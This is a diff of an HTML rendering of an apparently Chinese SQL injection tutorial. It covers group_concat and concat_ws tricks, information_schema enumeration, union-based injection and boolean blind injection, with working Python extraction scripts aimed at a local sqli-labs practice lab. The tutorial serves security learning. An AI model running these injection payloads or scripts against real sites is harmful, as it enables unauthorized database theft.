+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+---------+------------+-----------+</span><br><span class="line">| user_id | first_name | last_name |</span><br><span class="line">+---------+------------+-----------+</span><br><span class="line">|       1 | admin      | admin     |</span><br><span class="line">|       2 | Gordon     | Brown     |</span><br><span class="line">|       3 | Hack       | Me        |</span><br><span class="line">|       4 | Pablo      | Picasso   |</span><br><span class="line">|       5 | Bob        | Smith     |</span><br><span class="line">+---------+------------+-----------+</span><br></pre></td></tr></table></figure></div> 那么
+<code>select concat(first_name, last_name) from users;</code>
+命令运行结果如下，也就是说这个函数将查到的两个列拼在一起了。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> concat(first_name, last_name) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(first_name, last_name) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adminadmin                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> GordonBrown                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> HackMe                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PabloPicasso                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BobSmith                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br></pre></td></tr></table></figure></div> 而
+<code>select concat_ws('-', first_name, last_name) from users;</code>
+命令同样会把查到的两个列拼在一起，不过会在不同<strong>列</strong>之间插入一个用户定义的分隔符。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin<span class="operator">-</span>admin                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Gordon<span class="operator">-</span>Brown                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hack<span class="operator">-</span>Me                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Pablo<span class="operator">-</span>Picasso                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Bob<span class="operator">-</span>Smith                             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br></pre></td></tr></table></figure></div> <code>group_concat</code>
+函数可以把整个表中查询的所有内容拼成一个字符串，在不同<strong>行</strong>之间插入
+<code>,</code> 作为分隔。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(first_name, last_name) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(first_name, last_name)                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adminadmin,GordonBrown,HackMe,PabloPicasso,BobSmith <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div> 我们可以把
+<code>concat_ws</code> 和 <code>group_concat</code>
+的特性结合起来，这样就可以确保不同表格之间的内容都有分隔。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name)) <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>, first_name, last_name))      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin<span class="operator">-</span>admin,Gordon<span class="operator">-</span>Brown,Hack<span class="operator">-</span>Me,Pablo<span class="operator">-</span>Picasso,Bob<span class="operator">-</span>Smith <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div> ### 信息泄露过程 根据 <code>information_schema</code>
+数据库中的内容可以有如下查询顺序： <img 
+
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/d35a58a9e4678a6a7292bb65f15676e3.png"
-                      alt="在这里插入图片描述"
+                     data-src="images/d35a58a9e4678a6a7292bb65f15676e3.png"
+                     
+alt="在这里插入图片描述" 
                 ></p>
 <ul>
-<li>查询所有<strong>数据库</strong>名称。  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure></div></li>
-<li>查询特定<strong>数据库</strong>中的所有<strong>表</strong>的名称。  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure></div></li>
-<li>查询特定<strong>表</strong>中的所有<strong>字段</strong>的名称，这里注意多个数据库中可能有相同名称的表。  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&lt;table_name&gt;&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure></div></li>
-<li>查询特定<strong>字段</strong>对应的所有<strong>记录</strong>  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(<span class="operator">&lt;</span>column_name<span class="operator">&gt;</span>) <span class="keyword">from</span> [database_name.]<span class="operator">&lt;</span>table_name<span class="operator">&gt;</span>;</span><br><span class="line"><span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>, <span class="operator">&lt;</span>column_name<span class="operator">&gt;</span>, [...])) <span class="keyword">from</span> [database_name.]<span class="operator">&lt;</span>table_name<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></div>
-  具体查询可以通过前面实现的数据泄露原语完成。</li>
+<li>查询所有<strong>数据库</strong>名称。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat_ws(<span class="string">&#x27;-&#x27;</span>, schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure></div></li>
+<li>查询特定<strong>数据库</strong>中的所有<strong>表</strong>的名称。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure></div></li>
+<li>查询特定<strong>表</strong>中的所有<strong>字段</strong>的名称，这里注意多个数据库中可能有相同名称的表。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&lt;table_name&gt;&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure></div></li>
+<li>查询特定<strong>字段</strong>对应的所有<strong>记录</strong>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(<span class="operator">&lt;</span>column_name<span class="operator">&gt;</span>) <span class="keyword">from</span> [database_name.]<span class="operator">&lt;</span>table_name<span class="operator">&gt;</span>;</span><br><span class="line"><span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>, <span class="operator">&lt;</span>column_name<span class="operator">&gt;</span>, [...])) <span class="keyword">from</span> [database_name.]<span class="operator">&lt;</span>table_name<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></div> 具体查询可以通过前面实现的数据泄露原语完成。 #
+联合查询注入 联合查询注入就是利用 <code>UNION</code>
+操作符，将攻击者希望查询的语句注入到正常 <code>SELECT</code>
+语句之后，并返回输出结果。 ## 判断表中列数
+为了方便后续获取数据，需要先知道<strong>查询的表中显示的字段数</strong>，可以使用
+<code>order by &lt;column_num&gt;</code> 来进行判断。当
+<code>order by</code> 的数字大于当前的列数时候就会报错，SQL
+注入利用这个特性来判断列数。 <img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="images/5c709c7349c8f30fec1762fcfebc4d84.png"
+                     
+alt="在这里插入图片描述" 
+                ></li>
 </ul>
-<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p>联合查询注入就是利用 <code>UNION</code> 操作符，将攻击者希望查询的语句注入到正常 <code>SELECT</code> 语句之后，并返回输出结果。</p>
-<h2 id="判断表中列数"><a href="#判断表中列数" class="headerlink" title="判断表中列数"></a>判断表中列数</h2><p>为了方便后续获取数据，需要先知道<strong>查询的表中显示的字段数</strong>，可以使用 <code>order by &lt;column_num&gt;</code> 来进行判断。当 <code>order by</code> 的数字大于当前的列数时候就会报错，SQL 注入利用这个特性来判断列数。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/5c709c7349c8f30fec1762fcfebc4d84.png"
-                      alt="在这里插入图片描述"
-                ></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-1/&#x27;</span></span><br><span class="line"></span><br><span class="line">column_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    column_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Unknown column&quot;</span> <span class="keyword">in</span> requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; order by <span class="subst">&#123;column_num&#125;</span>%23&quot;</span>).text:</span><br><span class="line">        <span class="built_in">print</span>(requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; order by <span class="subst">&#123;column_num&#125;</span>%23&quot;</span>).text)</span><br><span class="line">        column_num -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(column_num)</span><br></pre></td></tr></table></figure></div>
-<h2 id="确定显示位"><a href="#确定显示位" class="headerlink" title="确定显示位"></a>确定显示位</h2><p>在一个网站的正常页面，服务端执行 SQL 语句查询数据库中的数据，客户端将数据展示在页面中，其中<strong>展示在页面中的数据</strong>在<strong>数据库查询的结果表</strong>中的<strong>位置</strong>就叫<strong>显示位</strong>。</p>
-<p>实际可以通过注入 <code>union select 1,2,...,&lt;column_num&gt;</code> 然后观察显示结果来确定显示位。</p>
-<p>这里注意最好确保 <code>union</code> 左边查询的内容为空（因为有的网页只显示第一条查询到的结果），这样并上 <code>1,2,...,&lt;column_num&gt;</code> 后结果只有一行，我们只需要观察显示在页面上的结果有哪些数字即可。<br><img  
+<h2 id="确定显示位">确定显示位</h2>
+<p>在一个网站的正常页面，服务端执行 SQL
+语句查询数据库中的数据，客户端将数据展示在页面中，其中<strong>展示在页面中的数据</strong>在<strong>数据库查询的结果表</strong>中的<strong>位置</strong>就叫<strong>显示位</strong>。</p>
+<p>实际可以通过注入 <code>union select 1,2,...,&lt;column_num&gt;</code>
+然后观察显示结果来确定显示位。</p>
+<p>这里注意最好确保 <code>union</code>
+左边查询的内容为空（因为有的网页只显示第一条查询到的结果），这样并上
+<code>1,2,...,&lt;column_num&gt;</code>
+后结果只有一行，我们只需要观察显示在页面上的结果有哪些数字即可。 <img 
+
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/9294d0debed40b803079f2bdb3dc7208.png"
-                      alt="在这里插入图片描述"
+                     data-src="images/9294d0debed40b803079f2bdb3dc7208.png"
+                     
+alt="在这里插入图片描述" 
                 ></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1&#x27; union select <span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(_ + <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(column_num)])&#125;</span>%23&quot;</span>).text)</span><br></pre></td></tr></table></figure></div>
-<h2 id="泄露原语"><a href="#泄露原语" class="headerlink" title="泄露原语"></a>泄露原语</h2><p><img  
+<h2 id="泄露原语">泄露原语</h2>
+<figure>
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/a08a012565526873e3eae271c57b39de.png"
-                      alt="在这里插入图片描述"
-                ></p>
+                     data-src="images/a08a012565526873e3eae271c57b39de.png"
+                     
+alt="在这里插入图片描述" 
+                >
+<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
+</figure>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=-1&#x27; union select 1,(<span class="subst">&#123;query_data&#125;</span>),3%23&quot;</span>).text</span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">r&#x27;Your Login name:([^&lt;\s]+)&#x27;</span>, html_content).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_data(<span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span>).split(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
-<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>盲注就是在 SQL 注入过程中，SQL 语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。而布尔盲注就是SQL语句执行后，页面不返回具体数据，数据库只返回 0 或者 1（真 or 假）。</p>
-<h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><ul>
-<li>正常查询，返回 True（语句执行成功）或者返回 False（语句执行成功没有查询到内容）。</li>
-<li>输入引号进行看页面变化，页面返回 False ，可能存在漏洞，也可能没有查询到内容。</li>
-<li>利用 <code>and</code> 进行判断，比如：<code>1 and 1=1</code> 和 <code>1 and 1=2</code> ，<code>1&#39; and   1=1#</code> 和 <code>1’ and 1=2#</code> ，对应 SQL 语句如下：  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#  如果前者执行的结果不一样，说明是数字型的布尔盲注</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"># 如果后者执行的结果不一样，说明是字符型的布尔盲注</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select * from users where id=&#x27;</span><span class="number">1</span><span class="string">&#x27; and 1=2#&#x27;</span>;</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="泄露数字"><a href="#泄露数字" class="headerlink" title="泄露数字"></a>泄露数字</h2><p>假设有一个 SQL 语句可以返回一个数字，但由于布尔盲注的条件是只返回条件判断的真假，我们无法直接获取 SQL 语句查询到的数字，但是我们可以构造对 SQL 语句查询结果的大小判断的语句从而使得问题具有单调性，进而可以二分出结果。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-8/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">query_num, num_max=<span class="number">10000</span></span>):</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = num_max</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; and (<span class="subst">&#123;query_num&#125;</span>)&gt;<span class="subst">&#123;m&#125;</span>%23&quot;</span>).text:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = m</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_value(<span class="string">&#x27;length(database())&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
-<h2 id="泄露字符串"><a href="#泄露字符串" class="headerlink" title="泄露字符串"></a>泄露字符串</h2><p>假设有一个 SQL 语句可以返回一个字符串，那么我们可以先通过 <code>length</code> 函数获取字符串长度，然后通过 <code>substr</code> 函数依次截取字符串中的每个字符并通过 <code>ascii</code> 函数转换为 ASCII 码，这样就可以使用泄露数字的方法解决。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">query_string</span>):</span><br><span class="line">    string_len = get_value(<span class="string">f&quot;length((<span class="subst">&#123;query_string&#125;</span>))&quot;</span>)</span><br><span class="line">    res_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(string_len):</span><br><span class="line">        res_string += <span class="built_in">chr</span>(get_value(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;query_string&#125;</span>),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))&quot;</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> res_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_string(<span class="string">&#x27;database()&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
+<h1 id="布尔盲注">布尔盲注</h1>
+<p>盲注就是在 SQL 注入过程中，SQL
+语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。而布尔盲注就是SQL语句执行后，页面不返回具体数据，数据库只返回
+0 或者 1（真 or 假）。 ## 判断是否存在注入 - 正常查询，返回
+True（语句执行成功）或者返回 False（语句执行成功没有查询到内容）。 -
+输入引号进行看页面变化，页面返回 False
+，可能存在漏洞，也可能没有查询到内容。 - 利用 <code>and</code>
+进行判断，比如：<code>1 and 1=1</code> 和 <code>1 and 1=2</code>
+，<code>1' and     1=1#</code> 和 <code>1’ and 1=2#</code> ，对应 SQL
+语句如下： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#  如果前者执行的结果不一样，说明是数字型的布尔盲注</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"># 如果后者执行的结果不一样，说明是字符型的布尔盲注</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select * from users where id=&#x27;</span><span class="number">1</span><span class="string">&#x27; and 1=2#&#x27;</span>;</span><br></pre></td></tr></table></figure></div> ## 泄露数字 假设有一个 SQL
+语句可以返回一个数字，但由于布尔盲注的条件是只返回条件判断的真假，我们无法直接获取
+SQL 语句查询到的数字，但是我们可以构造对 SQL
+语句查询结果的大小判断的语句从而使得问题具有单调性，进而可以二分出结果。
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-8/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">query_num, num_max=<span class="number">10000</span></span>):</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = num_max</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; and (<span class="subst">&#123;query_num&#125;</span>)&gt;<span class="subst">&#123;m&#125;</span>%23&quot;</span>).text:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = m</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_value(<span class="string">&#x27;length(database())&#x27;</span>))</span><br></pre></td></tr></table></figure></div> ## 泄露字符串 假设有一个 SQL
+语句可以返回一个字符串，那么我们可以先通过 <code>length</code>
+函数获取字符串长度，然后通过 <code>substr</code>
+函数依次截取字符串中的每个字符并通过 <code>ascii</code> 函数转换为 ASCII
+码，这样就可以使用泄露数字的方法解决。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">query_string</span>):</span><br><span class="line">    string_len = get_value(<span class="string">f&quot;length((<span class="subst">&#123;query_string&#125;</span>))&quot;</span>)</span><br><span class="line">    res_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(string_len):</span><br><span class="line">        res_string += <span class="built_in">chr</span>(get_value(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;query_string&#125;</span>),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))&quot;</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> res_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_string(<span class="string">&#x27;database()&#x27;</span>))</span><br></pre></td></tr></table></figure></div></p>
+<h1 id="时间盲注">时间盲注</h1>
+<p>盲注就是在 SQL 注入过程中，SQL
+语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
+## 判断是否存在注入
+由于没有任何的回显内容，所以无法通过正常的方法判断是否存在注入，可以使用
+<code>1 and sleep(5)#</code> 或者 <code>1' and sleep(5)#</code>
